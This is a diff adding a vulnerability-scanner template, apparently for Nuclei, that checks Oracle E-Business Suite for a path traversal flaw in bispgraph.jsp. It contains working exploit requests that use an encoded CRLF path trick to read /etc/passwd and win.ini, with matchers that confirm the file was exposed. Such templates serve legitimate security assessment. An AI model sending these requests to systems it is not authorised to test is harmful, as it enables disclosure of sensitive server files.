@@ -1,0 +1,48 @@
+id: oracle-ebs-lfi
+
+info:
+  name: Oracle EBS bispgraph Path Traversal
+  author: 111xnagashy
+  severity: high
+  description: |
+    This template checks for a Local File Inclusion vulnerability in Oracle EBS
+    via path traversal in `bispgraph.jsp`. It can potentially expose sensitive
+    files like `/etc/passwd` or `C:\windows\win.ini`.
+  reference:
+    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf
+    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
+    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
+  tags: oracle, lfi, path-traversal
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
+    matchers-condition: and   
+    matchers: 
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "bin/bash"
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=win.ini&ifl=c:/windows/"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
+    matchers-condition: and   
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[extensions]"
+          - "[fonts]"
+      - type: status
+        status:
+          - 200
